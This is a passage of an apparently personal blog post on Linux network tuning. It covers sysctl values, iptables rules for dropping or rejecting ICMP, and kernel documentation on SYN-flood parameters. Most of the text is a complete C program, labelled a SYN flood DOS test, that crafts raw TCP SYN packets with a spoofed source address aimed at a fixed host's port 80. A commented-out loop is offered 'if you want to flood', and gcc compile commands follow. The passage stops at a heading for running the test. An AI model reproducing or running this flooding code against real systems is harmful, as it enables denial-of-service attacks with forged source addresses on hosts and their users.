</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>if set <strong><em>1</em></strong>, there is no reply.<br /></p>

<h4>2.3 ip_default_ttl</h4>

<p>&#8230;</p>

<h4>2.4 ip_local_port_range</h4>

<p>&#8230;
&#8230;&#8230;</p>

<h2>3. iptables</h2>

<figure class='code'><figcaption><span>iptables - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">DROP</span>
</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span>
</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">filter</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">S</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span> <span class="o">--</span><span class="n">reject</span><span class="o">-</span><span class="n">with</span> <span class="n">icmp</span><span class="o">-</span><span class="n">host</span><span class="o">-</span><span class="n">unreachable</span>
</span></code></pre></td></tr></table></div></figure>


<p>They are different, try it!</p>

<h2>4. SYN Flood Test</h2>

<h3>Kernel about</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /usr/share/doc/kernel-doc-2.6.32/Documentation/networking/ip-sysctl.txt</span></code></pre></td></tr></table></div></figure>


<h4>tcp_fin_timeout</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_fin_timeout - INTEGER
</span><span class='line'>        Time to hold socket in state FIN-WAIT-2, if it was closed
</span><span class='line'>        by our side. Peer can be broken and never close its side,
</span><span class='line'>        or even died unexpectedly. Default value is 60sec.
</span><span class='line'>        Usual value used in 2.2 was 180 seconds, you may restore
</span><span class='line'>        it, but remember that if your machine is even underloaded WEB server,
</span><span class='line'>        you risk to overflow memory with kilotons of dead sockets,
</span><span class='line'>        FIN-WAIT-2 sockets are less dangerous than FIN-WAIT-1,
</span><span class='line'>        because they eat maximum 1.5K of memory, but they tend
</span><span class='line'>        to live longer. Cf. tcp_max_orphans.</span></code></pre></td></tr></table></div></figure>


<h4>tcp_max_syn_backlog</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_max_syn_backlog - INTEGER
</span><span class='line'>        Maximal number of remembered connection requests, which have not
</span><span class='line'>        received an acknowledgment from connecting client.
</span><span class='line'>        The minimal value is 128 for low memory machines, and it will
</span><span class='line'>        increase in proportion to the memory of machine.
</span><span class='line'>        If server suffers from overload, try increasing this number.</span></code></pre></td></tr></table></div></figure>


<h4>tcp_syn_retries</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_syn_retries - INTEGER
</span><span class='line'>        Number of times initial SYNs for an active TCP connection attempt
</span><span class='line'>        will be retransmitted. Should not be higher than 255. Default value
</span><span class='line'>        is 5, which corresponds to ~180seconds.</span></code></pre></td></tr></table></div></figure>


<h4>tcp_syncookies</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_syncookies - BOOLEAN
</span><span class='line'>        Only valid when the kernel was compiled with CONFIG_SYNCOOKIES
</span><span class='line'>        Send out syncookies when the syn backlog queue of a socket
</span><span class='line'>        overflows. This is to prevent against the common 'SYN flood attack'
</span><span class='line'>        Default: FALSE
</span><span class='line'>
</span><span class='line'>        Note, that syncookies is fallback facility.
</span><span class='line'>        It MUST NOT be used to help highly loaded servers to stand
</span><span class='line'>        against legal connection rate. If you see SYN flood warnings
</span><span class='line'>        in your logs, but investigation shows that they occur
</span><span class='line'>        because of overload with legal connections, you should tune
</span><span class='line'>        another parameters until this warning disappear.
</span><span class='line'>        See: tcp_max_syn_backlog, tcp_synack_retries, tcp_abort_on_overflow.
</span><span class='line'>
</span><span class='line'>        syncookies seriously violate TCP protocol, do not allow
</span><span class='line'>        to use TCP extensions, can result in serious degradation
</span><span class='line'>        of some services (f.e. SMTP relaying), visible not by you,
</span><span class='line'>        but your clients and relays, contacting you. While you see
</span><span class='line'>        SYN flood warnings in logs not being really flooded, your server
</span><span class='line'>        is seriously misconfigured.</span></code></pre></td></tr></table></div></figure>


<h4>tcp_synack_retries</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp_synack_retries - INTEGER
</span><span class='line'>        Number of times SYNACKs for a passive TCP connection attempt will
</span><span class='line'>        be retransmitted. Should not be higher than 255. Default value
</span><span class='line'>        is 5, which corresponds to ~180seconds.</span></code></pre></td></tr></table></div></figure>


<h3>SYN Flood Test DOS Attack with C Source Code (Linux)</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">    Syn Flood DOS with LINUX sockets</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include&lt;string.h&gt; </span><span class="c1">//memset</span>
</span><span class='line'><span class="cp">#include&lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include&lt;stdlib.h&gt; </span><span class="c1">//for exit(0);</span>
</span><span class='line'><span class="cp">#include&lt;errno.h&gt; </span><span class="c1">//For errno - the error number</span>
</span><span class='line'><span class="cp">#include&lt;netinet/tcp.h&gt;   </span><span class="c1">//Provides declarations for tcp header</span>
</span><span class='line'><span class="cp">#include&lt;netinet/ip.h&gt;    </span><span class="c1">//Provides declarations for ip header</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">pseudo_header</span>    <span class="c1">//needed for checksum calculation</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">source_address</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dest_address</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">placeholder</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">protocol</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">tcp_length</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcp</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="nf">csum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">register</span> <span class="kt">long</span> <span class="n">sum</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'>    <span class="k">register</span> <span class="kt">short</span> <span class="n">answer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">nbytes</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">sum</span><span class="o">+=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>        <span class="n">nbytes</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">nbytes</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">oddbyte</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="o">*</span><span class="p">((</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">oddbyte</span><span class="p">)</span><span class="o">=*</span><span class="p">(</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>        <span class="n">sum</span><span class="o">+=</span><span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sum</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">sum</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">);</span>
</span><span class='line'>    <span class="n">sum</span> <span class="o">=</span> <span class="n">sum</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">);</span>
</span><span class='line'>    <span class="n">answer</span><span class="o">=</span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">~</span><span class="n">sum</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">//Create a raw socket</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//Datagram to represent the packet</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">datagram</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="p">,</span> <span class="n">source_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>    <span class="c1">//IP header</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">//TCP header</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">datagram</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">));</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">source_ip</span> <span class="p">,</span> <span class="s">&quot;192.168.10.78&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.78&quot;);</span>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span><span class="s">&quot;10.10.24.79&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.111&quot;);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memset</span> <span class="p">(</span><span class="n">datagram</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> <span class="cm">/* zero out the buffer */</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//Fill in the IP Header</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">);</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">54321</span><span class="p">);</span>  <span class="c1">//Id of this packet</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">//Set to 0 before calculating checksum</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>    <span class="c1">//Spoof the source ip address</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//TCP Header</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack_seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>      <span class="cm">/* first and only tcp segment */</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">fin</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">syn</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">rst</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">psh</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">window</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">5840</span><span class="p">);</span> <span class="cm">/* maximum allowed window size */</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="cm">/* if you set a checksum to zero, your kernel&#39;s IP stack</span>
</span><span class='line'><span class="cm">                should fill in the correct checksum during transmission */</span>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">//Now the IP checksum</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">source_address</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>
</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">dest_address</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">tcp_length</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">psh</span><span class="p">.</span><span class="n">tcp</span> <span class="p">,</span> <span class="n">tcph</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">psh</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pseudo_header</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//IP_HDRINCL to tell the kernel that headers are included in the packet</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s </span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">,</span> <span class="n">errno</span> <span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//Uncommend the loop if you want to flood :)</span>
</span><span class='line'>    <span class="c1">//while (1)</span>
</span><span class='line'>    <span class="c1">//{</span>
</span><span class='line'>        <span class="c1">//Send the packet</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span>      <span class="cm">/* our socket */</span>
</span><span class='line'>                    <span class="n">datagram</span><span class="p">,</span>   <span class="cm">/* the buffer containing headers and data */</span>
</span><span class='line'>                    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span><span class="p">,</span>    <span class="cm">/* total length of our datagram */</span>
</span><span class='line'>                    <span class="mi">0</span><span class="p">,</span>      <span class="cm">/* routing flags, normally always 0 */</span>
</span><span class='line'>                    <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span>   <span class="cm">/* socket addr, just like in */</span>
</span><span class='line'>                    <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>       <span class="cm">/* a normal send() */</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">//Data send successfully</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Packet Send </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="c1">//}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>test start</h3>

<h4>compile with gcc</h4>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>indent -kr -i8 sysflood.c
</span><span class='line'>gcc synflood.c -o synflood
</span></code></pre></td></tr></table></div></figure>


<h4>test bash (Only running three seconds)</h4>

